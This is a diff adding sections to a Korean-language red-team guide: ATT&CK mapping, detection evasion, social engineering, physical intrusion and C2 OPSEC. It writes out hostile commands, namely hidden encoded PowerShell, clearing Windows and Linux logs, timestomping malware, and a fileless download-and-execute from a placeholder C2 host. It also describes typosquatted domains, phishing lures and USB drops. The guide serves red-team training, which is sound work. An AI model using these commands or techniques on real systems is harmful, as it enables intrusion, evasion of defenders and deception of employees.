@@ -497,7 +497,63 @@ Rubeus.exe diamond \
 
 ---
 
-## 7. 레드팀 보고서 구조
+## 7. MITRE ATT&CK 프레임워크 매핑
+
+### ATT&CK 매트릭스 개요
+```
+전술 (Tactic) → 기법 (Technique) → 절차 (Procedure)
+
+주요 전술 14개:
+  TA0043 Reconnaissance      → 정찰
+  TA0042 Resource Development → 자원 개발
+  TA0001 Initial Access       → 초기 접근
+  TA0002 Execution            → 실행
+  TA0003 Persistence          → 지속성
+  TA0004 Privilege Escalation → 권한 상승
+  TA0005 Defense Evasion      → 방어 우회
+  TA0006 Credential Access    → 자격증명 접근
+  TA0007 Discovery            → 발견
+  TA0008 Lateral Movement     → 측면 이동
+  TA0009 Collection           → 수집
+  TA0011 Command and Control  → C2
+  TA0010 Exfiltration         → 유출
+  TA0040 Impact               → 영향
+```
+
+### 레드팀 작전과 ATT&CK 매핑 예시
+```
+초기 접근 (T1566 Phishing)
+  └─→ 실행 (T1059 Command and Script Interpreter)
+        └─→ 지속성 (T1053 Scheduled Task/Job)
+              └─→ 권한 상승 (T1055 Process Injection)
+                    └─→ 자격증명 접근 (T1003 OS Credential Dumping)
+                          └─→ 측면 이동 (T1550 Pass the Hash)
+                                └─→ 유출 (T1048 Exfiltration Over Alternative Protocol)
+```
+
+### 주요 기법별 탐지 회피 전략
+```bash
+# T1059.001 PowerShell 탐지 우회
+# AMSI 우회 + ETW 비활성화 후 실행
+powershell -w hidden -ep bypass -enc <BASE64>
+
+# T1003.001 LSASS 덤프 탐지 우회
+# 직접 LSASS 접근 대신 VSS 활용
+# 또는 MiniDumpWriteDump API 대신 NtReadVirtualMemory 직접 호출
+
+# T1070.001 이벤트 로그 삭제 탐지
+wevtutil cl Security
+wevtutil cl System
+wevtutil cl Application
+# 단, 로그 삭제 자체가 이벤트 ID 1102로 기록됨 → 주의
+
+# T1027 난독화
+# 인코딩, 암호화, 패킹 등으로 정적 분석 우회
+```
+
+---
+
+## 8. 레드팀 보고서 구조
 
 ```markdown
 # 레드팀 최종 보고서
@@ -541,4 +597,97 @@ Priority 2 (30일 내):
   - Tier 모델 (관리자/일반 분리)
   - Privileged Access Workstation
   - 네트워크 분리 강화
+```
+
+---
+
+## 9. 물리적 레드팀 기법
+
+### 사회공학 (Social Engineering)
+```
+스피어 피싱 캠페인 준비:
+  1. OSINT로 표적 직원 프로파일링
+     - LinkedIn, 회사 홈페이지, SNS
+  2. 신뢰할 수 있는 발신자 위장
+     - 동료, 협력사, IT 팀
+  3. 상황에 맞는 미끼 (Lure) 제작
+     - 인사 발령, 급여명세서, 청구서
+  4. 페이로드 포함 문서 또는 링크
+     - 매크로 포함 Word/Excel
+     - HTML Smuggling
+     - ISO/ZIP 파일 (MOTW 우회)
+
+Vishing (전화 사기):
+  - IT 지원팀 위장 비밀번호 요청
+  - 긴급 상황 연출 (심리적 압박)
+
+Baiting (미끼):
+  - USB 드롭 공격 (주차장, 로비)
+  - 악성 USB에 자동실행 페이로드
+```
+
+### 물리적 접근
+```
+건물 침투 방법:
+  1. Tailgating — 직원 뒤에 따라 들어가기
+  2. 택배기사/수리기사 위장
+  3. 잠금 픽킹 (Lock Picking)
+  4. 리더기 클로닝 (RFID/NFC 카드)
+
+내부 접근 후:
+  - RJ45 탭 또는 Wi-Fi 펌프킨으로 트래픽 캡처
+  - USB Rubber Ducky로 빠른 페이로드 실행
+  - LAN Turtle — 인라인 네트워크 임플란트
+```
+
+---
+
+## 10. 레드팀 운영 보안 (OPSEC)
+
+### 인프라 구성
+```
+레드팀 인프라 (레이어드 구조):
+
+인터넷
+  │
+  ├── 리다이렉터 (Redirector)
+  │     - 클라우드 VPS (AWS/Azure/GCP)
+  │     - 실제 C2 IP 숨김
+  │     - Apache/Nginx mod_rewrite
+  │
+  └── C2 서버 (팀 서버)
+        - VPN으로만 접속
+        - 공개 IP 없음
+        - 로그 암호화 보관
+```
+
+### 도메인 프론팅 및 CDN 악용
+```bash
+# CloudFront 도메인 프론팅 (현재 대부분 차단됨)
+# 대안: CDN 제공사의 합법적 도메인 뒤에 C2 숨기기
+
+# 합법적으로 보이는 도메인 등록
+# - typosquatting: micosoft.com, googgle.com
+# - 카테고리화 우선: news, sports, cdn 관련 도메인
+# - 오래된 도메인 구매 (Domain Age 우선)
+
+# 도메인 신뢰도 확인
+curl "https://www.virustotal.com/vtapi/v2/domain/report?domain=DOMAIN&apikey=API_KEY"
+```
+
+### 흔적 최소화
+```bash
+# 타임스탬프 조작
+touch -t 202001010000 malicious.exe    # 타임스탬프 변경
+touch -r legit.dll malicious.dll       # 합법 파일의 타임스탬프 복사
+
+# 메모리에서만 실행 (파일리스 공격)
+# PowerShell IEX (다운로드 및 메모리 실행)
+powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://C2/payload.ps1')"
+
+# 로그 삭제 (탐지 위험 있음)
+# Windows
+wevtutil cl Security
+# Linux
+> /var/log/auth.log    # 파일 내용 비우기 (삭제보다 덜 눈에 띔)
 ```
